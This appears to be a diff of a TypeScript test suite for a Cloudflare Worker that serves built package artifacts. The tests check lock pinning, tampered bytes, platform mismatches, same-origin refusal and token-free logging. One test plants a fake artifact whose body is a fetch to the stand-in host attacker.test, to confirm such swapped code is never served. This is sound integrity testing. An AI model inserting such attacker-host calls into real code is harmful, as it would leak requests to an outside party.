@@ -1,5 +1,11 @@
+import { dependencyGraphHash } from "@grasp-os/shared/dependencies";
 import { toHex } from "@grasp-os/shared/encoding";
-import type { DependencyIntent, PackageBuild } from "@grasp-os/shared/packages";
+import { graspLockSchema, lockGraph } from "@grasp-os/shared/packages";
+import type {
+  DependencyIntent,
+  GraspLock,
+  PackageBuild,
+} from "@grasp-os/shared/packages";
 import type { Role } from "@grasp-os/shared/roles";
 import { createExecutionContext } from "cloudflare:test";
 import { env } from "cloudflare:workers";
@@ -8,7 +14,7 @@ import { describe, expect, it, vi } from "vite-plus/test";
 import worker from "../src/index.ts";
 import { packageArtifactAddress } from "../src/packages/address.ts";
 import { mockIdp } from "./idp.ts";
-import { intentFor, named, publish } from "./npm.ts";
+import { failure, intentFor, named, publish } from "./npm.ts";
 import { clientOrigin } from "./sign-in-config.ts";
 import { auditedDuring, coreOrigin, routed, signedInApi } from "./sign-in.ts";
 
@@ -16,8 +22,9 @@ import { auditedDuring, coreOrigin, routed, signedInApi } from "./sign-in.ts";
 // model: a file served without the policy the build relies on, or as
 // another type; a file of a graph no longer approved, of an artifact the
 // lock no longer pins, or bytes other than the ones built; an artifact
-// read by its hashes alone; code for Workers sent to a browser; and the
-// files reached by any other path. The packages are real builds, from
+// read by its hashes alone; code for Workers sent to a browser; a lock
+// resolved against another React; and the files reached by any other
+// path. The packages are real builds, from
 // connect's strict fake of the npm registry; what the browser then does
 // under the policy is e2e/package-artifacts.e2e.ts.
 
@@ -108,6 +115,57 @@ const servedBuild = async () => {
   }
   return { ...approved, name, built, address: built.address };
 };
+
+/** The App's lock, as core stores it. */
+const lockFor = async ({ app, graphHash }: Approved): Promise<GraspLock> => {
+  const row = await env.DB.prepare(
+    "SELECT lock FROM dependency_locks WHERE app_id = ? AND graph_hash = ?"
+  )
+    .bind(app, graphHash)
+    .first<{ lock: string }>();
+  return graspLockSchema.parse(JSON.parse(row?.lock ?? "null"));
+};
+
+/** Stores `lock` as the App's, as if core had written it. */
+const storeLockFor = async (
+  { app, graphHash }: Approved,
+  lock: GraspLock
+): Promise<void> => {
+  await env.DB.prepare(
+    "UPDATE dependency_locks SET lock = ? WHERE app_id = ? AND graph_hash = ?"
+  )
+    .bind(JSON.stringify(lock), app, graphHash)
+    .run();
+};
+
+/** The fields of each line `level` logged while `run` ran. */
+const loggedDuring = async (
+  level: "warn" | "error",
+  run: () => Promise<unknown>
+): Promise<unknown[]> => {
+  const spy = vi.spyOn(console, level).mockReturnValue();
+  try {
+    await run();
+    return spy.mock.calls.map(([fields]: unknown[]) => fields);
+  } finally {
+    spy.mockRestore();
+  }
+};
+
+/** The status core answers `path` with. */
+const statusOf = async (path: string): Promise<number> => {
+  const response = await routed(path);
+  return response.status;
+};
+
+/** The lines among `logged` for `event`. */
+const eventsNamed = (logged: unknown[], event: string): unknown[] =>
+  logged.filter(
+    (fields) =>
+      typeof fields === "object" &&
+      fields !== null &&
+      Reflect.get(fields, "event") === event
+  );
 
 const sha256 = async (bytes: ArrayBuffer): Promise<string> =>
   toHex(new Uint8Array(await crypto.subtle.digest("SHA-256", bytes)));
@@ -246,8 +304,8 @@ describe("serving an App's built packages", () => {
 
   it("serves nothing once the graph is no longer approved, and logs each refusal without filling the audit trail", async () => {
     const { app, request, address, name } = await servedBuild();
-    // An approval taken back: nothing in the product does it yet, so the
-    // test does what such a decision would leave behind.
+    // An approval taken back: nothing in the product does it until
+    // GRA-359, so the test does what such a decision would leave behind.
     await env.DB.prepare(
       "UPDATE dependency_requests SET status = 'denied' WHERE id = ?"
     )
@@ -288,9 +346,11 @@ describe("serving an App's built packages", () => {
     ).toHaveLength(5);
   });
 
-  it("serves nothing the lock no longer pins", async () => {
+  it("serves a browser build the lock pins, by either release whose pins it keeps, and nothing it no longer pins", async () => {
     const served = await servedBuild();
-    // A resolve that changes the browser target's entries unpins its build.
+    const file = `${served.address}${served.name}.js`;
+    // A resolve that sets other entries for the browser leaves the pin of
+    // the entries built as it was.
     await served.builder.api.dependencies.resolve(
       intentFor(
         served.app,
@@ -298,21 +358,119 @@ describe("serving an App's built packages", () => {
         { entries: [served.name, `${served.name}/index.js`] }
       )
     );
+    const afterResolve = await statusOf(file);
+    const lock = await lockFor(served);
+    const pins = Object.values(lock.artifacts ?? {}).flatMap((each) =>
+      Object.entries(each)
+    );
+    // Pinned by another release, running beside this one, and none of
+    // this one's.
+    await storeLockFor(served, {
+      ...lock,
+      artifacts: { "release-beside": Object.fromEntries(pins) },
+    });
+    const otherRelease = await statusOf(file);
+    // Dropped, as a pin one too many is.
+    await storeLockFor(served, { ...lock, artifacts: {} });
+    const dropped = await statusOf(file);
 
-    const response = await routed(`${served.address}${served.name}.js`);
-    expect(response.status).toBe(404);
+    expect({ afterResolve, otherRelease, dropped }).toStrictEqual({
+      afterResolve: 200,
+      otherRelease: 200,
+      dropped: 404,
+    });
   });
 
-  it("serves no bytes but the ones built", async () => {
-    const { built, address, name } = await servedBuild();
+  it("serves no bytes but the ones built, and the next build makes them again, to the pin", async () => {
+    const served = await servedBuild();
+    const { built, address, name } = served;
     await env.FILES.put(
       `package-builds/${built.hash}/${name}.js`,
       `fetch("https://attacker.test/swapped");`
     );
 
     const response = await seen(await routed(`${address}${name}.js`));
+    const again = await buildOf(served);
+    const healed = await seen(await routed(`${address}${name}.js`));
+    expect({
+      status: response.status,
+      attacker: response.body.includes("attacker"),
+      again: [again.hash, again.stats === null],
+      healed: [healed.status, healed.body.includes("attacker")],
+    }).toStrictEqual({
+      status: 404,
+      attacker: false,
+      again: [built.hash, false],
+      healed: [200, false],
+    });
+  });
+
+  it("serves nothing of a lock this release can't read, and answers not found", async () => {
+    const served = await servedBuild();
+    // As an older release wrote it, its pins in another shape.
+    const lock = await lockFor(served);
+    await env.DB.prepare(
+      "UPDATE dependency_locks SET lock = ? WHERE app_id = ? AND graph_hash = ?"
+    )
+      .bind(
+        JSON.stringify({
+          ...lock,
+          artifacts: { older: { browser: { hash: served.built.hash } } },
+        }),
+        served.app,
+        served.graphHash
+      )
+      .run();
+    const response = await routed(`${served.address}${served.name}.js`);
     expect(response.status).toBe(404);
-    expect(response.body).not.toContain("attacker");
+  });
+
+  it("builds and serves nothing of a lock resolved against another React, and says to resolve again", async () => {
+    const served = await servedBuild();
+    // As a release with another React finds a lock, and its approval,
+    // from before it.
+    const lock = await lockFor(served);
+    const older: GraspLock = {
+      ...lock,
+      platformPeers: { react: "18.3.1", "react-dom": "18.3.1" },
+    };
+    const olderHash = await dependencyGraphHash(lockGraph(older));
+    await env.DB.batch([
+      env.DB.prepare(
+        "UPDATE dependency_locks SET graph_hash = ?, lock = ? WHERE app_id = ? AND graph_hash = ?"
+      ).bind(olderHash, JSON.stringify(older), served.app, served.graphHash),
+      env.DB.prepare(
+        "UPDATE dependency_requests SET graph_hash = ? WHERE id = ?"
+      ).bind(olderHash, served.request.id),
+    ]);
+    const old = { ...served, graphHash: olderHash };
+    const address = await packageArtifactAddress(env, {
+      app: served.app,
+      graphHash: olderHash,
+      hash: served.built.hash,
+    });
+
+    let code = "";
+    let status = 0;
+    let errors: unknown[] = [];
+    const warned = await loggedDuring("warn", async () => {
+      errors = await loggedDuring("error", async () => {
+        ({ code } = await failure(buildOf(old)));
+        ({ status } = await routed(`${address}${served.name}.js`));
+      });
+    });
+
+    expect({
+      code,
+      status,
+      warned: eventsNamed(warned, "packages.platform_changed").length > 0,
+      errors: eventsNamed(errors, "packages.lock_changed"),
+    }).toStrictEqual({
+      code: "package.platform_changed",
+      status: 404,
+      warned: true,
+      errors: [],
+    });
   });
 
   it("serves no target but the browser's, even with a token for it: the lock pins only the browser build as the browser's", async () => {
@@ -340,6 +498,31 @@ describe("serving an App's built packages", () => {
     }).toStrictEqual({ address: null, status: 404, browser: 200 });
   });
 
+  it("serves no file to the product page's own request for it", async () => {
+    const { address, name } = await servedBuild();
+    const asked = async (site?: string) => {
+      const response = await routed(`${address}${name}.js`, {
+        headers: site === undefined ? {} : { "sec-fetch-site": site },
+      });
+      return [response.status, response.headers.get("vary")];
+    };
+
+    // Only screens' frames load these, from an opaque origin: cross-site
+    // to a browser. The product page's own requests are same-origin,
+    // whatever token they carry. Each answer varies on the header, so a
+    // copy a frame's load left in the browser's cache never answers the
+    // page.
+    expect({
+      frame: await asked("cross-site"),
+      productPage: await asked("same-origin"),
+      unsaid: await asked(),
+    }).toStrictEqual({
+      frame: [200, "sec-fetch-site"],
+      productPage: [403, "sec-fetch-site"],
+      unsaid: [200, "sec-fetch-site"],
+    });
+  });
+
   it("is the only way to an artifact's files", async () => {
     const { built, name } = await servedBuild();
     const module = `${name}.js`;
@@ -361,19 +544,30 @@ describe("serving an App's built packages", () => {
 
 // The request log keeps no token: an address read from it reads nothing.
 describe("logging an artifact's request", () => {
-  it("leaves the token out of the path it logs", async () => {
+  it("leaves the token out of the path it logs, however the path is written", async () => {
     const { address, name } = await servedBuild();
     const token = address.split("/").at(-2) ?? "";
+    const rest = address.slice("/package-artifacts".length);
     const info = vi.spyOn(console, "info").mockReturnValue();
     let lines: string[] = [];
     try {
-      await routed(`${address}${name}.js`);
+      for (const path of [
+        `${address}${name}.js`,
+        // An empty segment, and one too many, before the token; and an
+        // empty segment where the token goes, the token after it.
+        `/package-artifacts/${rest}${name}.js`,
+        `/package-artifacts/extra${rest}${name}.js`,
+        `${address.replace(`/${token}/`, `//${token}/`)}${name}.js`,
+      ]) {
+        // oxlint-disable-next-line no-await-in-loop -- one log line each
+        await routed(path);
+      }
       lines = info.mock.calls.map((call) => JSON.stringify(call));
     } finally {
       info.mockRestore();
     }
-    const logged = lines.filter((line) => line.includes("/package-artifacts/"));
-    expect(logged).toHaveLength(1);
+    const logged = lines.filter((line) => line.includes("/package-artifacts"));
+    expect(logged).toHaveLength(4);
     expect(logged.filter((line) => line.includes(token))).toStrictEqual([]);
   });
 });
